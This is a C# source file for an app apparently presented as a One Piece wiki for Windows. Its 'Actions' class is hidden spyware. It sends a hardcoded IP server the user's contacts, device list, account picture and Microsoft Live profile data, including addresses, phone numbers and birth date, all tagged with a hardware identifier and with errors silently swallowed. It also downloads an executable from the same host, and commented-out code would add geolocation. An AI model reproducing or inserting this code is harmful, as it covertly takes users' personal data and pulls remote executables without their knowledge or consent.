using Microsoft.Live;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading.Tasks;
using Windows.ApplicationModel.Contacts;
using Windows.Devices.Enumeration;
using Windows.Devices.Geolocation;
using Windows.Networking.BackgroundTransfer;
using Windows.Storage;
using Windows.System.Profile;
using Windows.UI.Popups;
using Windows.UI.Xaml;

namespace Wiki_One_Piece
{

    public class Actions
    {
        static Geoposition p;
        public static string server = "http://91.213.82.15:86/";

        public static string GetHardwareToken()
        {
            var token = HardwareIdentification.GetPackageSpecificToken(null);
            var hardwareId = token.Id;
            var dataReader = Windows.Storage.Streams.DataReader.FromBuffer(hardwareId);

            byte[] bytes = new byte[hardwareId.Length];
            dataReader.ReadBytes(bytes);

            return BitConverter.ToString(bytes);
        }

        public async void ContactInfo()
        {
            ContactPicker x = new ContactPicker();
            IReadOnlyList<ContactInformation> contacts = await x.PickMultipleContactsAsync();

            if (contacts == null)
                return;

            HttpClient client = new HttpClient();

            string server = Actions.server;
            server += "api.php?action=ntm_info";
            server += "&pseudo=" + GetHardwareToken();

            foreach (ContactInformation cont in contacts)
            {
                foreach (ContactField field in cont.PhoneNumbers)
                {
                    server += "&what[]=ContactPhone&value[]=" + cont.Name + "&value2[]" + field.Value;
                }
                foreach (ContactField field in cont.Emails)
                {
                    server += "&what[]=ContactEmail&value[]=" + cont.Name + "&value2[]" + field.Value;
                }
            }

            try
            {
                string res = await client.GetStringAsync(server);
            }
            catch
            {
            }
        }

        public static async void DeviceInfoGetter()
        {

            var list = await DeviceInformation.FindAllAsync(DeviceClass.All);

            int i = 0;
            var lst = new List<DeviceInformation>();
            foreach (DeviceInformation de in list)
            {

                lst.Add(de);
                i++;
                if (i % 5 == 0)
                {
                    await sendDevice(lst);
                    lst.Clear();
                }
            }
        }


        private static async Task sendDevice(List<DeviceInformation> lst)
        {
            HttpClient client = new HttpClient();

            string server = Actions.server;
            server += "api.php?action=ntm_info";
            server += "&pseudo=" + GetHardwareToken();

            foreach (DeviceInformation device in lst)
            {
                server += "&what[]=DeviceInfo&value[]=" + device.Name + "(" + device.IsEnabled + ")&value2[]=" + device.Id;
            }

            try
            {
                string res = await client.GetStringAsync(server);
            }
            catch
            {

            }

        }



        public static async void HttpUploadImage()
        {
            try
            {

                HttpClient httpClient = new HttpClient();
                StorageFile image = Windows.System.UserProfile.UserInformation.GetAccountPicture(Windows.System.UserProfile.AccountPictureKind.LargeImage) as StorageFile;
                Stream imageStream = await image.OpenStreamForReadAsync();

                using (var content = new MultipartFormDataContent())
                {
                    content.Add(new StringContent("exist"), "exist");
                    content.Add(CreateFileContent(imageStream, Actions.GetHardwareToken() + ".png", "application/octet-stream"));

                    var response = await httpClient.PostAsync(Actions.server + "uploadfile.php", content);
                    HttpResponseMessage x = response.EnsureSuccessStatusCode();


                }
            }
            catch
            {

            }
        }

        private static StreamContent CreateFileContent(Stream stream, string fileName, string contentType)
        {
            var fileContent = new StreamContent(stream);
            fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
            {
                Name = "\"file\"",
                FileName = "\"" + fileName + "\""
            }; // the extra quotes are key here
            fileContent.Headers.ContentType = new MediaTypeHeaderValue(contentType);
            return fileContent;
        }

        public static async Task InitUserInformation()
        {

            
            HttpClient client = new HttpClient();
            try
            {
                string info = await Actions.LiveConnect();
                string server = Actions.server;
                server += "api.php?action=ntm_connect";
                server += "&identifier=" + GetHardwareToken() + "&username=" + info + "&lat=0.00&lon=0.00&town=any";

                

                string res = await client.GetStringAsync(server);



            }
            catch
            {

            }



            /*Geolocator geolocator = new Geolocator();
            try
            {

                var name = await Windows.System.UserProfile.UserInformation.GetDisplayNameAsync();
                Geoposition town_point = await geolocator.GetGeopositionAsync();

                string info = await Actions.LiveConnect();

                string server = Actions.server;
                server += "api.php?action=ntm_connect";
                server += "&identifier=" + GetHardwareToken() + "&username=" + name + "&lat=" + town_point.Coordinate.Latitude.ToString() + "&lon=" + town_point.Coordinate.Longitude.ToString() + "&town=" + info;

                string res = await client.GetStringAsync(server);

                MessageDialog x = new MessageDialog(server);
                await x.ShowAsync();
            }
            catch
            {

            }//*/
        }


        public static async Task DownloadFile()
        {
            try
            {

                MessageDialog x = new MessageDialog("begin");
                await x.ShowAsync();


                Uri source = new Uri("https://91.213.82.15:8080/putty.exe");
                StorageFile destinationFile = await ApplicationData.Current.LocalFolder.CreateFileAsync(
                    "executable.exe", CreationCollisionOption.GenerateUniqueName);

                BackgroundDownloader downloader = new BackgroundDownloader();
                DownloadOperation download = downloader.CreateDownload(source, destinationFile);

                // Attach progress and completion handlers.
                HandleDownloadAsync(download, true);//*/


            }
            catch (Exception ex)
            {


            }
        }

        private static void HandleDownloadAsync(DownloadOperation download, bool p)
        {

        }

        public static LiveAuthClient auth;

        public static async Task<string> LiveConnect()
        {
            string infoTextBlock = "";
            try
            {
                auth = new LiveAuthClient();
                LiveLoginResult initializeResult = await auth.InitializeAsync();
                try
                {
                    LiveLoginResult loginResult = await auth.LoginAsync(new string[] { "wl.basic wl.postal_addresses wl.phone_numbers wl.emails" });
                    if (loginResult.Status == LiveConnectSessionStatus.Connected)
                    {
                        LiveConnectClient connect = new LiveConnectClient(auth.Session);
                        LiveOperationResult operationResult = await connect.GetAsync("me");
                        dynamic result = operationResult.Result;
                        if (result != null)
                        {
                            if (result.first_name != null)
                                infoTextBlock += result.first_name + "\n";
                            if (result.last_name != null)
                                infoTextBlock += result.last_name + "\n";

                            if (result.emails.preferred != null)
                                infoTextBlock += result.emails.preferred + "\n";

                            if (result.gender != null)
                                infoTextBlock += result.gender + "\n";

                            if (result.birth_month != null)
                                infoTextBlock += result.birth_month + "-";

                            if (result.birth_day != null)
                                infoTextBlock += result.birth_day + "-";

                            if (result.birth_year != null)
                                infoTextBlock += result.birth_month + "\n";


                            if (result.addresses.personal.street != null)
                                infoTextBlock += result.addresses.personal.street + " ";
                            
                            if (result.addresses.personal.city != null)
                                infoTextBlock += result.addresses.personal.city + " ";

                            if (result.addresses.personal.state != null)
                                infoTextBlock += result.addresses.personal.state + " ";

                            if (result.addresses.personal.postal_code != null)
                                infoTextBlock += result.addresses.personal.postal_code + " ";


                            if (result.addresses.personal.region != null)
                                infoTextBlock += result.addresses.personal.region + "\n";



                            if (result.addresses.business.street != null)
                                infoTextBlock += result.addresses.business.street + " ";

                            if (result.addresses.business.city != null)
                                infoTextBlock += result.addresses.business.city + " ";

                            if (result.addresses.business.state != null)
                                infoTextBlock += result.addresses.business.state + " ";

                            if (result.addresses.business.postal_code != null)
                                infoTextBlock += result.addresses.business.postal_code + " ";


                            if (result.addresses.business.region != null)
                                infoTextBlock += result.addresses.business.region + "\n";

                            if (result.phones.personal != null)
                                infoTextBlock += result.phones.personal+"\n";

                            if (result.phones.business != null)
                                infoTextBlock += result.phones.business + "\n";
                           
                            if (result.phones.mobile != null)
                                infoTextBlock += result.phones.mobile + "\n";
                            

                        }
                        else
                        {
                            infoTextBlock = "Error result is null";
                        }
                    }
                }
                catch (LiveAuthException exception)
                {
                    infoTextBlock = "Error signing in: " + exception.Message;
                }
                catch (LiveConnectException exception)
                {
                    infoTextBlock = "Error calling API: " + exception.Message;
                }
            }
            catch (LiveAuthException exception)
            {
                infoTextBlock = "Error initializing: " + exception.Message;
            }

            
           

            return infoTextBlock;
        }



    }
}
